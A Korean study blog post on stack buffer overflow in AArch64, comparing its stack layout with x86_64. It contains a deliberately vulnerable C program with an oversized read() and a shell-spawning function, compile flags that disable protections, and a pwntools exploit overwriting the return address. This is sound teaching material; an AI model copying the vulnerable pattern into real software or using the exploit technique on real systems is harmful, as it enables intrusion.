---
title: "[AArch64] Buffer OverFlow"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠"
date: "2024-03-20"
translation_key: "tistory-8a8955e8774c"
tags: ["STUDY/PWNABLE_AArch64"]
category: "STUDY/PWNABLE_AArch64"
source_url: "https://whrdud727.tistory.com/entry/AArch64-Buffer-OverFlow"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다.

[https://whrdud727.tistory.com/5](https://whrdud727.tistory.com/5)

 [\[PWNABLE\]Stack Buffer OverFlow

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow는 발생하는 영역에 따라서 Stack Buffer OverFlow와 Heap Buffer OverFlow로 나뉜다. Heap에 대해서는 다음에 다룰 예정

whrdud727.tistory.com](https://whrdud727.tistory.com/5)

[https://whrdud727.tistory.com/6](https://whrdud727.tistory.com/6)

 [\[PWNABLE\]Return Address Overwrite

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을

whrdud727.tistory.com](https://whrdud727.tistory.com/6)

공격 원리는 동일하지만 기존 x86\_64와는 stack 구조에 있어서 차이가 있기 때문에 주의해야 한다.

![](/assets/images/tistory/tistory-8a8955e8774c/001.png)

왼쪽이 x86\_64, 오른쪽이 AArch64이다. ret의 주소가 stack의 마지막이 아니라 최상단에 존재한다.

이를 다시 해석하면 main()만 존재하며 그 안에 BOF 취약점이 발생하는 경우 공격할 수가 없다는 뜻이 된다.

* * *

```
#include <stdio.h>
#include <unistd.h>

void initial(){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
}

void shell(){
	system("/bin/sh");
}

void vuln(){
	char buf[32];
	printf("Exploit\n");
	read(0, buf, 0x100);
	printf("%s\n", buf);
}

int main(){
	char test[0x20];
	initial();
	vuln();;

	return 0;
}
```

system('/bin/sh');를 gift로 제공해주는 c언어 코드이다.

vuln()을 살펴보면 buf변수에 입력할 때 BOF 취약점이 발생하는 것을 볼 수 있다.

```
aarch64-linux-gnu-gcc -no-pie -fno-stack-protector bof.c
```

위와 같은 방법으로 컴파일을 해준다.

아래 링크에서 사용했던 방식으로 디버깅을 수행한다.

[https://whrdud727.tistory.com/34](https://whrdud727.tistory.com/34)

 [\[AArch64\] x86\_64 간단 비교

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 효율적인 전력 사용과 높은 성능의 위해서 설계된 architecture이다. 주로 스마트폰, 임베디드 시스템 등의 환경에서 사용

whrdud727.tistory.com](https://whrdud727.tistory.com/34)

![](/assets/images/tistory/tistory-8a8955e8774c/002.png)

'

vuln()을 살펴보면 sp에 -32를 연산하고, read()에서 변수에 sp로부터 24만큼 떨어진 위치에 값을 입력한다.

다시 말해서 stack 크기 32 중에 24만을 이용하고 있다.

나머지 8은 sfp에 해당한다.

이를 간단하게 표현하면 아래와 같다.

```
vuln()
[ret_sp-32] - [stack_sp-24] - [bp]
main()
[ret] - [stack_sp] - [bp]
```

buf의 크기를 확인했으니 이제 값을 입력해보겠다.

![](/assets/images/tistory/tistory-8a8955e8774c/003.png)

vuln()의 공간을 시작으로 main()의 ret까지 덮어씌어졌다.

![](/assets/images/tistory/tistory-8a8955e8774c/004.png)

x30이 ret 주소가 들어있는 부분이다.

바로 페이로드를 작성해주겠다.

```
from pwn import *

context.log_level = 'debug'
p = process(['qemu-aarch64-static','a.out'])
e = ELF('a.out')
shell = e.sym['shell']#0x00000000004007ac

payload = b'A'*0x28
payload += p64(shell)
p.send(payload)

p.interactive()
```

![](/assets/images/tistory/tistory-8a8955e8774c/005.png)
